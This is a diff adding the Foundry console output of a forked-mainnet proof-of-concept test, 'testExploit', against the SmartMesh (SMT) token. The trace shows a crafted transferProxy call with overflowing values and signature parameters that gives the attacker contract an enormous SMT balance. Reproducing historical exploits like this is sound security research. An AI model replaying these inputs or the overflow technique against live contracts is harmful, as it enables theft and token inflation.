@@ -1,0 +1,44 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/SmartMesh_exp.sol:SmartMesh
+[PASS] testExploit() (gas: 118064)
+Logs:
+  Attacker Before exploit SMT Balance: 0.000000000000000000
+  Attacker After exploit SMT Balance: 50659039041325835497812305941300959685805618291217746767262.693003461994217473
+
+Traces:
+  [10735] SmartMesh::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 5499034 [5.499e6])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [118064] SmartMesh::testExploit()
+    ├─ [3462] SMT::symbol() [staticcall]
+    │   └─ ← [Return] "SMT"
+    ├─ [2649] SMT::balanceOf(SmartMesh: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [2444] SMT::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker Before exploit SMT Balance", val: 0, decimals: 18)
+    ├─ [81362] SMT::transferProxy(0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F, 0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F, 65133050195990359925758679067386948167464366374422817272194891004451135422463 [6.513e76], 50659039041325835497812305941300959685805618291217746767262693003461994217473 [5.065e76], 27, 0x87790587c256045860b8fe624e5807a658424fad18c2348460e40ecf10fc8799, 0x6c879b1e8a0a62f23b47aa57a3369d416dd783966bd1dda0394c04163a98d8d8)
+    │   ├─ [3000] PRECOMPILES::ecrecover(0xd6d57172b96a1ef19ed7b27c42583206f29c9c5f14ca9145738856cbe514e51a, 27, 61276061222369650866624912002229797457106560001799691573297349435870532110233, 49089382594757373392813692786525107866179093487605773010201389562896471087320)
+    │   │   └─ ← [Return] 0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F
+    │   ├─ emit Transfer(_from: 0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F, _to: 0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F, _value: 65133050195990359925758679067386948167464366374422817272194891004451135422463 [6.513e76])
+    │   ├─ emit Transfer(_from: 0xDF31A499A5A8358b74564f1e2214B31bB34Eb46F, _to: SmartMesh: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _value: 50659039041325835497812305941300959685805618291217746767262693003461994217473 [5.065e76])
+    │   ├─  storage changes:
+    │   │   @ 0x444d6cc666eab17b17077b9abdee40de4b60c35f4397cf3fa5a0f9eba844bd93: 0 → 1
+    │   │   @ 0xcbca2c2e1a1577eb2e25b9dce980a2cead88d4a5422449a454760a1d38d5b82a: 0 → 0x7000000000000000000000000000000000000000000000000000000000000001
+    │   │   @ 0x3789435f4a55bbac3675e7d4b2ad00e0a8ea6616b1531ed26dcd1b5c30d386d1: 0 → 0x8fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   └─ ← [Return] true
+    ├─ [1462] SMT::symbol() [staticcall]
+    │   └─ ← [Return] "SMT"
+    ├─ [649] SMT::balanceOf(SmartMesh: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 50659039041325835497812305941300959685805618291217746767262693003461994217473 [5.065e76]
+    ├─ [444] SMT::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker After exploit SMT Balance", val: 50659039041325835497812305941300959685805618291217746767262693003461994217473 [5.065e76], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.46s (2.20s CPU time)
+
+Ran 1 test suite in 4.72s (3.46s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
